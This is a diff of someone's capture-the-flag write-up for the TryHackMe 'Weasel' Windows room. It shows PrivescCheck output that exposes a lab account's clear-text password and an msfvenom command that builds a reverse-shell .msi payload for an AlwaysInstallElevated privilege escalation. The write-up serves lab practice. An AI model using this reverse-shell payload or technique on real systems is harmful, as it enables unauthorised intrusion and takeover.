@@ -1,5 +1,5 @@
 `solution = https://www.youtube.com/watch?v=2Jv957vQhS4`
-`export IP='10.10.85.96'`
+
 # Weasel
 `url = https://tryhackme.com/room/weasel`
 `date = 05/28/2023`
@@ -80,10 +80,35 @@ weasel.txt
     - Now we can go to the desktop & cat out the user flag which is found here - `C:\Users\dev-datasci-lowpriv\Desktop` using the more command - `more user.txt`. We get `THM{w3as3ls_@nd_pyth0ns}`.
 
 ## PrivEsc
+
  * **WinPEAAS**
     - We can get winPEAAS from here - `https://raw.githubusercontent.com/carlospolop/PEASS-ng/master/winPEAS/winPEASps1/WinPeas.ps1`.
     - Performing curl is not working, hence we can do the python server method : `curl http://10.6.36.128:8000/a.ps1 --output a.ps1`.
-    - 
+    - I spent a day & I thought instead of winPEAAS I should try privescCheck.
+
+ * **PrivescCheck**
+```bash
++------+------------------------------------------------+------+       
+| TEST | CREDS > WinLogon                               | VULN |       
++------+------------------------------------------------+------+       
+| DESC | Parse the Winlogon registry keys and check whether    |       
+|      | they contain any clear-text password. Entries that    |       
+|      | have an empty password field are filtered out.        |       
++------+-------------------------------------------------------+       
+[*] Found 1 result(s).
+
+
+Domain   : DEV-DATASCI-JUP
+Username : dev-datasci-lowpriv
+Password : wUqnKWqzha*W!PWrPRWi!M8faUn
+```
+
+* PrivescCheck returns this output which shows leaked creds for the `dev-datasci-jup` user to be `wUqnKWqzha*W!PWrPRWi!M8faUn`.
+* The solution video also talks about "always elevated" privs. For exploiting this we can get a `.msi` payload from msfvenom using the command:
+```bash
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=$LOCAL_IP LPORT=$LOCAL_P -f msi > buttstabber.msi
+```
+
 
 ## Explaination Time !!
 ---
